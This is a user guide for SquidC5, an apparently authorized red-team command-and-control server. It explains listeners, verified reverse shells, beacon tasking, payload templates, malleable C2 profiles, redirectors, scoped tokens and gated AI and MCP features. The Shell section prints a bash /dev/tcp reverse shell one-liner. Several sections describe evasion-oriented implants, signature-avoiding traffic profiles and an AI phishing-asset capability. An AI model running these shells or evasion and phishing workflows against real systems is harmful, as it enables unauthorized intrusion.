# SquidC5 User Guide

**Command • Control • Cognitive • Collaborative • Coordination**

**Authorized red team / penetration testing only.**  
This guide lives in the GitHub repository. It is **not** served by the C2 process (`/docs` on the server stays disabled).

**Source of truth:** [docs/user-guide.md](https://github.com/DotNetRussell/SquidC5/blob/master/docs/user-guide.md) on branch `master`.

### What C5 stands for

| Pillar | In SquidC5 |
|--------|------------|
| **Command** | Task shells and beacons; issue operator intent |
| **Control** | Auth scopes, policy engine, listeners, feature kill-switches |
| **Cognitive** | Admin AI (railed) + external MCP tools (allow-listed) |
| **Collaborative** | Teams, chat, handoff, shared ops console |
| **Coordination** | C2 profiles, task queues, metrics, timeline, reports |

| Related docs | Purpose |
|--------------|---------|
| [Operator runbook](operator-runbook.md) | Short how-to procedures |
| [Deployment](deployment.md) | Docker lab + binary prod |
| [Vision](squidc5-vision.md) | Product / security architecture |
| [Threat model](threat-model.md) | Trust boundaries |
| [Roadmap](roadmap-2026-2027.md) | Planned work |

### Concepts primer (Grokpedia)

Background reading for operators who want the *security-industry* meaning of a term, not just SquidC5 UI steps. These open **[Grokpedia](https://grok.com/pedia)** concept pages (external). SquidC5 still only runs under **authorized** ROE.

| Concept | Why it matters here | Grokpedia |
|---------|---------------------|-----------|
| Command and control (C2) | Overall role of SquidC5 as a team server | [command-and-control](https://grok.com/pedia/command-and-control) · [c2](https://grok.com/pedia/c2) |
| Red team | Authorized adversarial simulation | [red-team](https://grok.com/pedia/red-team) |
| Penetration testing | Scoped offensive assessment | [penetration-testing](https://grok.com/pedia/penetration-testing) |
| Payload | Delivered code/stage that runs on a target | [payload](https://grok.com/pedia/payload) |
| Implant | Persistent or resident agent on a target | [implant](https://grok.com/pedia/implant) |
| Beacon | Periodic check-in style implant | [beacon](https://grok.com/pedia/beacon) |
| Reverse shell | Target connects *out* to operator listener | [reverse-shell](https://grok.com/pedia/reverse-shell) |
| DNS tunneling | Covert channel over DNS | [dns-tunneling](https://grok.com/pedia/dns-tunneling) |
| WebSocket | Bidirectional web channel (WS beacons) | [websocket](https://grok.com/pedia/websocket) |
| Phishing | Credential/payload delivery vector (authorized only) | [phishing](https://grok.com/pedia/phishing) |
| Model Context Protocol | External tool bridge pattern (MCP panel) | [model-context-protocol](https://grok.com/pedia/model-context-protocol) |

If a Grokpedia slug 404s or is empty (SPA), search from [grok.com/pedia](https://grok.com/pedia) for the term. Industry references also: [MITRE ATT&CK — Command and Control](https://attack.mitre.org/tactics/TA0011/).

---

## Overview

### What SquidC5 is

SquidC5 is a **security-first, AI-native C5** platform — **Command, Control, Cognitive, Collaborative, Coordination** — for **authorized** engagements. In industry language it fills the role of a command-and-control (C2) *team server*: the hub operators use to task implants, receive output, and manage listeners during a red-team or pen-test, with AI assist and multi-operator coordination built in under secure defaults (scoped tokens, audit, AI rails).

Operators use:

- **REST API** (scoped tokens)
- **Ops UI** at `/ops` (browser console)
- **CLI** `sc5` / `squidc5-cli`

**Learn more:** [Grokpedia: command-and-control](https://grok.com/pedia/command-and-control) · [red-team](https://grok.com/pedia/red-team)

### Why it is designed this way

- **Deny by default** — MCP off, public OpenAPI off, empty CORS, admin UI only after server-side scope check
- **Deterministic implants** — templates and fixed generators over free-form agent loops
- **Auditability** — operator, AI, MCP, and feature changes go through policy/audit
- **Port flexibility** — no hard requirement for 80/443
- **Dual AI** — external models stay on allow-listed MCP tools; Admin AI stays capability-gated and sanitizes untrusted input

### High-level architecture

```text
Operator (CLI /ops)
    → API (scopes + policy)
        → Sessions / Tasks / Listeners / Payloads
        → Admin AI (sandboxed) / MCP (allow-listed)
        → SQLite data/ (local, never commit)
Implants / reverse shells → Listeners → Sessions
```

### Engagement lifecycle (mental model)

1. **Stand up** team server + admin token  
2. **Open listeners** for the channels you will use  
3. **Generate payloads/implants** pointed at those listeners (and active C2 profile if HTTP)  
4. **Execute only on authorized targets** per ROE  
5. **Operate** via Shell (interactive) or Tasks (beacon queue)  
6. **Observe** metrics/audit/events; hand off via chat/report  
7. **Tear down** listeners, revoke tokens, preserve audit as required  

---

## Security model

### What

- **Tokens** `sc5_<urlsafe>` with scopes (`admin`, `sessions:read`, `shell:interact`, …)
- **Admin UI code** (`console.js`) only after the server validates the token
- **Admin AI** sanitizes untrusted input; capabilities are allow-listed
- **MCP** tools are per-token allow-listed; feature often off by default
- **Public docs** hard-locked off on the running server

### Why

A compromised browser or leaked non-admin token must not receive admin control surface or open-ended AI tooling.

### How

```bash
# Bootstrap token (first start) — store securely, rotate
cat data/admin_token.txt   # local
# docker exec squidc5 cat /data/admin_token.txt

# Default: HTTPS with unique self-signed cert (data/tls/)
sc5 login --url https://HOST:8443 --token sc5_...
sc5 whoami
```

### Transport encryption (TLS)

New instances **generate a unique self-signed certificate** on first start (`data/tls/server.crt` + `server.key`) and serve **ops UI, API, and MCP** over HTTPS. Tokens are encrypted on the wire to the browser/CLI (after you accept the self-signed warning or pin the cert). Override with CA certs via `SQUIDC5_TLS_CERT_FILE` / `SQUIDC5_TLS_KEY_FILE`, or terminate TLS on a redirector. See [deployment.md](deployment.md#tls-https--default-on-new-instances).

---

## Ops console

### What

Browser UI at `https://HOST:8443/ops` (HTTPS by default). Connection settings stay in **browser localStorage** only. Layout order, wide tiles, and panel open state are also local — **never** persisted to the C2 server.

### Why

Operators need a phone-friendly and desktop console without shipping secrets back into git or requiring server-side UI preferences.

### How

1. Open `/ops` on the C2 host (same-origin avoids CORS issues).
2. Paste **API token** → **Save & Connect**.
3. Connection panel collapses when a token is saved.
4. Drag **⋮⋮** to reorder cards; **⟷** expands a card to a full row (local only).

### Example

```text
http://127.0.0.1:8443/ops
Token: sc5_… (from data/admin_token.txt)
```

---

## Connection

### What

Server URL, API token, and refresh interval for the ops UI.

### Why

The UI is a pure client. Without a token, only public shell HTML loads; admin panels load only after `/api/v1/ops/console.js` accepts the token.

### How

| Field | Meaning |
|-------|---------|
| Server URL | Base URL, e.g. `http://159.x.x.x:8443` |
| API token | `sc5_…` Bearer token |
| Refresh | Poll interval for sessions/metrics/events |

### Example (CLI equivalent)

```bash
sc5 login --url http://HOST:8443 --token sc5_...
sc5 config
```

---

## Event stream

### What

Live feed of recent server events (shell connect/verify/reject, listeners, tasks, etc.), newest first.

### Why

Operators watch check-ins without opening full audit or metrics dumps.

### How

Populated from `GET /api/v1/metrics` → `recent_events`. Refreshes with the Connection poll interval.

### Example events

| Type | Meaning |
|------|---------|
| `shell.connected` | Inbound reverse shell TCP accepted |
| `shell.verified` | Exec probe passed |
| `session.rejected` / `shell.false_positive` | Noise/scanner dropped |
| `listener.started` | Listener bound and running |

---

## Status overview

### What

Dashboard tiles: verified shells, listeners up, active sessions, open tasks, HTTP hits, stabilized count, false shells, AI calls, uptime.

### Why

One glance at engagement health before diving into panels.

### How

Aggregates `/api/v1/sessions`, `/api/v1/listeners`, `/api/v1/tasks`, and metrics counters. Height always fits content (not a fixed scroll tile).

---

## Identity

### What

Who the current token is: actor name, type, token id prefix, and **scopes**.

### Why

Scopes gate every panel and API route. Mis-scoped tokens look “broken” until you inspect identity.

### How

- UI: **Whoami** → `GET /api/v1/meta`
- **Health** → `GET /api/v1/health` (no secrets)

### Example

```bash
sc5 whoami
# scopes: admin, sessions:read, shell:interact, ...
```

---

## Shell

### What

Interactive command runner for **verified reverse shells** only.

A **reverse shell** is a pattern where the *target* initiates a connection *outbound* to your listener, then presents a remote command line. That is the opposite of a bind shell (target listens). Outbound connections often pass egress firewalls more easily during authorized tests.

**Learn more:** [Grokpedia: reverse-shell](https://grok.com/pedia/reverse-shell)

### Why

Unverified or echo-only sockets are dangerous noise (Internet scanners, TLS ClientHellos, HTTP probes on common ports). SquidC5:

1. **Classifies** inbound bytes (drops obvious non-shells)
2. **Exec-probes** the channel (must run a real command)
3. Marks sessions **verified** only if the probe succeeds  

Only then does the Shell panel accept operator commands.

### How

1. Start a `reverse_shell` listener and get a verified session.
2. Select session → enter command → **Run**.
3. **All verified** broadcasts to every verified shell.
4. **Buffer** reads captured session output (`GET /api/v1/sessions/{id}/output`).

Not a full interactive PTY multiplexer: commands are sent, output is collected with wait/idle windows. Prefer short commands; long interactive programs may not behave like a local terminal.

### Example

```bash
sc5 listeners create rev 4444 --kind reverse_shell
sc5 listeners start <id>
# target (authorized): bash -i >& /dev/tcp/HOST/4444 0>&1
sc5 sessions list --shells
sc5 shell <session_id> "whoami"
sc5 shell all "id"
```

### Why stage-2 stabilize

Raw reverse shells die on network blips and often lack a clean line protocol. Auto-stabilize injects a reconnecting agent (Linux Python / Windows PowerShell) that re-checks in to `SQUIDC5_PUBLIC_HOST:<port>` and supports reliable command execution. Stage-2 reconnects skip re-staging (banner skip).

---

## Sessions

### What

All tracked implant/shell connections (beacons, reverse shells, closed). A **session** is SquidC5’s first-class object for “something on a target that can be tasked or shelled.”

### Why

Sessions unify:

- Interactive reverse shells  
- Beacon implants (HTTP/DNS/WS)  
- Lifecycle (active / closed / rejected)  

Reaping drops zombies so operators are not fooled by “live but mute” entries.

### How

| Action | Behavior |
|--------|----------|
| List all | Full session table |
| Reap dead | Probe and close dead/mute shells |
| Close selected | Closes shell chosen in Shell panel |

### Example

```bash
sc5 sessions list
sc5 sessions list --shells --include-dead
sc5 sessions reap
sc5 sessions close <id>
```

### Session kinds (operator view)

| Kind | Interaction model |
|------|-------------------|
| `reverse_shell` / `tcp` | Prefer **Shell** panel after `verified: true` |
| `beacon` (HTTP/DNS/WS) | Prefer **Tasks** queue; poll for results |

---

## Tasks

### What

Async command queue for **beacon** implants (not interactive reverse shells).

A **beacon** is an implant that periodically *checks in* to C2, asks for work, and returns results—classic low-and-slow C2 rather than a permanent interactive shell.

**Learn more:** [Grokpedia: beacon](https://grok.com/pedia/beacon) · [implant](https://grok.com/pedia/implant)

### Why

Beacons sleep between check-ins (interval + optional jitter via profiles). Tasks wait until the next poll, then return results—suitable for intermittent connectivity and reduced network chatter during authorized ops.

### How

1. Get beacon `session_id` from sessions list.
2. Create task with command.
3. Poll task status until complete (`pending` → `running`/`complete`).

Do **not** use Shell for pure beacons; use Tasks.

### Example

```bash
sc5 tasks create <beacon_session_id> "id"
sc5 tasks get <task_id>
sc5 tasks list --session <beacon_session_id>
```

### Lifecycle detail

```text
Operator creates task → stored in DB
Beacon check-in → claims task → runs command on target
Beacon posts result → task complete → operator reads output
```

---

## Listeners

### What

Server-side acceptors for implant traffic—the sockets (or protocol handlers) bound on the team server (or host network) that wait for targets to connect or query.

### Why

Different channels need different handlers:

| Kind | Use | Industry context |
|------|-----|------------------|
| `reverse_shell` | bash `/dev/tcp`, python reverse shells | Classic reverse shell |
| `http` | HTTP beacon check-ins | Web-looking C2 |
| `tcp` | Generic TCP channel | Raw framing |
| `dns` | DNS TXT C2 (set zone) | Covert DNS channel |

**Learn more:** [Grokpedia: reverse-shell](https://grok.com/pedia/reverse-shell) · [dns-tunneling](https://grok.com/pedia/dns-tunneling) · [websocket](https://grok.com/pedia/websocket)

### How to set up

1. **Create** name + port + kind (+ DNS zone if `dns`).
2. **Start** until status is `running`.
3. Open host firewall for that port (and UDP for DNS if applicable).
4. Point payloads/shells at `HOST:port` (or DNS zone for DNS beacons).
5. Confirm with Event stream / sessions list.

### Privileged ports

Non-root process: ports &lt; 1024 need host sysctl  
`net.ipv4.ip_unprivileged_port_start=0`.

### Example

```bash
sc5 listeners create rev 443 --kind reverse_shell --host 0.0.0.0
sc5 listeners start <id>
sc5 listeners list
```

Docker **host** networking binds real host ports. Bridge mode requires publishing every listener port.

### Common failure modes

| Symptom | Check |
|---------|--------|
| Listener created but not `running` | Start failed—port in use, privilege, bind host |
| Target cannot connect | Firewall, NAT, wrong public host, wrong port |
| Flood of rejections | Scanners hitting the port—expected; false-shell filter works |

---

## Payloads and implants

### What

**Payloads** are the generated scripts/binaries you deliver to an authorized target. **Implants** are the resident agents those payloads become once running—beacons, memory-resident helpers, stagers, etc.

In SquidC5, generators are **deterministic templates**: same inputs → reviewable output you can diff and archive for the engagement file.

**Learn more:** [Grokpedia: payload](https://grok.com/pedia/payload) · [implant](https://grok.com/pedia/implant) · [beacon](https://grok.com/pedia/beacon)

### Why

- **Auditability** — know exactly what you executed  
- **Reproducibility** — regenerate for a new host/port without mystery tooling  
- **Channel match** — reverse-shell templates need reverse-shell listeners; HTTP beacons need HTTP (+ profile shape)  
- **OpSec** — pair with [C2 profiles](#c2-profiles) so HTTP traffic is not a default fingerprint  

### How

1. Choose **template** or **implant family**.
2. Set callback **host** and **port** (scheme/zone if needed).
3. Prefer activating a **C2 profile** first for HTTP surface shape.
4. **Generate** → review output → stage via approved delivery (never outside ROE).
5. Confirm check-in on Event stream / Sessions.

### Stager vs full implant (concept)

| Stage | Role in SquidC5 |
|-------|-----------------|
| Stager / template | Small first stage (`reverse_shell_*`, simple beacons) |
| Stage-2 stabilize | Server-injected reconnect agent on captured shells |
| Implant family | Higher-level generators (`http_beacon`, `dns_beacon`, `linux_memfd`, `bof`, …) |

### Example templates

| Template | Listener |
|----------|----------|
| `reverse_shell_bash` / `reverse_shell_python` | `reverse_shell` |
| `http_beacon_python` / `http_beacon_bash` | `http` (often on API port) |
| `dns_beacon_python` | `dns` + zone |
| `ws_beacon_python` | WebSocket routes |
| `memory_beacon_python` / `linux_memfd` | Evasion-oriented Linux paths |
| `windows_ps_beacon` | Windows PowerShell beacon |
| `bof_c` | BOF-style C skeleton (advanced) |

```bash
sc5 payloads templates
sc5 payloads generate reverse_shell_bash 203.0.113.10 4444 --raw
sc5 payloads generate http_beacon_python 203.0.113.10 8443 --raw
```

### Safety checklist

- [ ] Written authorization / ROE covers the target  
- [ ] Callback host/port are *your* infrastructure  
- [ ] Listener is `running` before execution  
- [ ] Payload archived for the engagement record  
- [ ] Cleanup plan exists  

---

## Plugins

### What

Optional signed/catalog server extensions (e.g. lab recon helpers).

### Why

Keep core binary small; add curated capabilities without open-ended remote code from the internet. Plugins remain allow-listed under policy.

### How

1. **Catalog** — list available modules.
2. **Install + enable** by catalog name.
3. **Installed** — what is loaded.

### Example

```text
Ops → Plugins → Catalog → install "lab_recon" → Install + enable
```

---

## Redirector and certificates

### What

OpSec helpers: nginx reverse-proxy snippet and TLS cert plan text.

### Why

Fronting C2 through a redirector/CDN reduces direct exposure of the team server.

### How

- Enter `server_name` and beacon URI paths.
- **Nginx snippet** → copy to redirector host.
- **Cert plan** → issuance steps (does not auto-issue on the droplet).

### Example

```text
server_name: cdn.lab.example
uris: /jquery.js,/api/sync
→ generate nginx location blocks pointing at team server
```

---

## Observability

### What

Metrics counters and append-only **audit** log of operator/API actions.

### Why

After-action review, dispute resolution, and detection of misuse of the C2 itself.

### How

```bash
sc5 metrics
sc5 audit --limit 50
sc5 events   # SSE stream if available
```

UI: **Metrics** / **Audit log** buttons dump JSON into the panel outbox.

---

## Admin AI

### What

Sandboxed, **allow-listed** AI capabilities on the server (not free-form agents). Capabilities are fixed functions (`recon_assist`, `shell_classify`, …) with structured inputs—not an open chat that can chain arbitrary tools.

### Why

Assist recon notes, shell classification, payload hints, and engagement docs—without:

- Feeding raw hostile session output into unconstrained agent loops  
- Giving external models direct shell  
- Shipping API keys back to browsers  

Untrusted text is passed through `sanitize_untrusted` before prompts.

**Phishing-related capabilities** exist only for **authorized** engagements (phishing simulations under ROE).  
**Learn more:** [Grokpedia: phishing](https://grok.com/pedia/phishing)

### How

1. Configure an LLM under **LLM connections** (optional).
2. Without LLM → offline/deterministic fallbacks still return structured guidance.
3. Pick capability + input → **Run AI**.
4. Review **Status** / **Debug** (never returns API keys).

| Capability | Intent |
|------------|--------|
| `recon_assist` | Structured recon suggestions |
| `shell_classify` | Classify shell/session context |
| `payload_template` | Template guidance |
| `phishing_asset` | Authorized phishing content assist |
| `doc_generate` | Engagement documentation drafts |

### Example

```bash
sc5 ai recon_assist --data "windows domain, no creds yet"
sc5 ai shell_classify --data "session looks like scanner"
```

---

## LLM connections

### What

BYO OpenAI-compatible endpoints (including xAI Grok) stored **server-side** in `data/`.

### Why

Admin AI needs a model; keys must never return in status APIs or git.

### How

```bash
sc5 llm add grok-prod grok-4 --provider xai --base-url https://api.x.ai/v1 --api-key "$XAI_KEY"
sc5 llm list
```

Status: `GET /api/v1/ai/status` shows provider/model presence, **not** the key.

---

## Tokens

### What

Mint and revoke scoped API tokens for operators, automation, or MCP.

### Why

Least privilege: phone UI might only need `shell:interact` + `sessions:read`; external AI needs `mcp:connect` + tool allow-list.

### How

1. Choose preset (operator / read-only / listener / AI / admin / custom).
2. **Mint** — raw `sc5_…` shown **once**.
3. Revoke from list if compromised.

### Example

```bash
sc5 tokens create phone --scopes "sessions:read,shell:interact,metrics:read"
sc5 tokens list
sc5 tokens revoke <id>
```

---

## Timeline and reports

### What

Anomaly hints, chronological timeline, exportable engagement report.

### Why

Handoff and after-action need more than raw audit lines.

### How

Ops panel buttons call observability endpoints (metrics/audit scoped). Export for offline notes — still authorized-use only.

---

## Operator chat

### What

Short shared notes between operators on this instance.

### Why

Handoff without external chat leaking engagement context.

### How

Send message → stored server-side → visible to `collab:use` / admin tokens.

---

## C2 profiles

### What

**Malleable C2 profiles** define the *shape* of implant traffic—especially HTTP(S): URI paths, headers, body wrapping, jitter, and decoy-friendly patterns. The *active* profile is the contract between **generators** and the **server parser**.

Industry context: commercial C2 frameworks popularized “malleable profiles” so operators can mimic CDNs, APIs, or static sites instead of a fixed default URI.

**Learn more:** [Grokpedia: command-and-control](https://grok.com/pedia/command-and-control) · [beacon](https://grok.com/pedia/beacon)

### Why

Default C2 fingerprints are easy for defenders to signature. Profiles:

- Change URI/header surface  
- Support jitter so check-ins are not metronomic  
- Align redirector configs (see [Redirector and certificates](#redirector-and-certificates))  

### How

1. List profiles → **activate** one.
2. **Generate beacon (active)** so implants match that profile.
3. After switching profiles, **regenerate** implants — old beacons may miss the new surface.
4. If you front with nginx/CDN, update redirector URIs to match the profile.

### Example

```text
Ops → C2 profiles → activate "jquery-cdn" → Generate beacon (active)
# payload uses profile paths/headers; server expects the same
```

### Operator pitfalls

| Mistake | Result |
|---------|--------|
| Activate profile B, keep beacons built for A | Check-ins fail or never task |
| Redirector paths ≠ profile paths | 404 / silent drop at edge |
| Change profile mid-op without regen | Split fleet behavior |

---

## Feature toggles

### What

Runtime kill-switches enforced by the server (MCP, AI paths, etc.).

### Why

Incident response: disable a capability without redeploying. Defaults stay secure; `public_docs` cannot be enabled.

### How

```bash
# API (admin)
curl -H "Authorization: Bearer $TOK" http://HOST:8443/api/v1/features
```

UI: flip toggles → **Save features**.

---

## Policy

### What

Risk / allow-deny engine: thresholds, HITL gates, chain limits.

### Why

High-risk actions can require human approval or be denied outright — rails for AI and automation.

### How

1. **Get policy** — current JSON.
2. Edit carefully → **Save policy**.
3. Bad policy can lock operators out or weaken guardrails — treat as production config.

### Example

```bash
sc5 policy get
sc5 policy set --file rules.json
```

---

## MCP tools

### What

Bridge for **external** AI/tools using an allow-listed tool-call pattern (Model Context Protocol style). External models invoke *named tools* with JSON arguments; SquidC5 executes only tools on that token’s allow-list.

**Learn more:** [Grokpedia: model-context-protocol](https://grok.com/pedia/model-context-protocol)

### Why

External models must not get open-ended shell on the C2. Design goals:

- **Least privilege** — `mcp:connect` + explicit `mcp_tools`  
- **Determinism** — prefer single-step tools over autonomous multi-hop agents  
- **Audit** — each call is logged  
- **Default off** — feature flag until an engagement needs it  

### How

1. Enable MCP via features/settings when approved.
2. Mint a token with `mcp:connect` and a tight `mcp_tools` list (e.g. `list_sessions`, `create_task`).
3. **List tools** / **Call** with JSON args from Ops or CLI.

### Example

```bash
sc5 tokens create ext-ai --scopes "mcp:connect,sessions:read,tasks:read,tasks:write,metrics:read"
# ensure mcp_tools allow-list set via API/UI as supported
sc5 mcp tools
sc5 mcp call list_sessions --args-json '{}'
```

### Contrast: MCP vs Admin AI

| | Admin AI | MCP |
|--|----------|-----|
| Who | Operators on the team server | External models / agents |
| Gate | `ai:use` + capability allow-list | `mcp:connect` + per-tool allow-list |
| Default | Offline fallback if no LLM | Often feature-off |

---

## Verified reverse shells (overview card)

### What

Live TCP reverse shells that passed classification + exec probe.

### Why

Prefer these for Shell commands. Dead/echo-only connections are reaped.

### How

See [Shell](#shell) and [Listeners](#listeners).

---

## Signal

### What

Quick metric chips from the last poll (stabilized, false positives, AI calls, etc.).

### Why

Confirm the API is healthy and counters are moving without opening Observability.

---

## CLI reference

Primary entry points after install:

```bash
sc5 login --url <base> --token <sc5_...>
sc5 health | whoami | metrics | audit | events | repl
sc5 sessions list|get|close|reap
sc5 tasks list|get|create
sc5 listeners list|create|start|stop|delete
sc5 payloads templates|generate
sc5 shell <session_id> "<cmd>"
sc5 tokens list|create|revoke
sc5 ai <capability> [--data "..."]
sc5 llm list|add
sc5 mcp tools|call
sc5 policy get|set
```

Config: `~/.config/squidc5/config.json` (never commit).  
Env: `SQUIDC5_URL`, `SQUIDC5_TOKEN`.

Full surface also documented in [AGENTS.md](../AGENTS.md) (developer/agent memory).

---

## Deployment

### Lab (Docker)

```bash
docker compose up --build -d
docker exec squidc5 cat /data/admin_token.txt
```

### Production (binary only)

1. PR → CI green → merge `master`
2. CI builds `squidc5-linux-x64` + release
3. Deploy **that binary only**; keep `data/` intact

See [deployment.md](deployment.md). **Do not** rsync WIP source to prod.

---

## Troubleshooting

| Symptom | Checks |
|---------|--------|
| Reverse shell never appears | Listener `running`? Firewall? Port publish (Docker bridge)? Privileged port sysctl? |
| Shell listed but mute | Exec probe failed → reaped; check false-shell filter / stage-2 |
| Admin panels missing | Token scopes? Hard-refresh? `console.js` 403? |
| CORS errors | Open `/ops` on the C2 host, not `file://` or wrong origin |
| Beacon no tasks | Wrong session id? Profile mismatch? Listener kind `http`? |
| AI offline only | No LLM configured under LLM connections |

---

## Authorized use reminder

SquidC5 is for **legitimate, authorized** security testing only. Unauthorized access to computer systems is illegal. Operators are responsible for engagement scope, rules of engagement, and data handling.
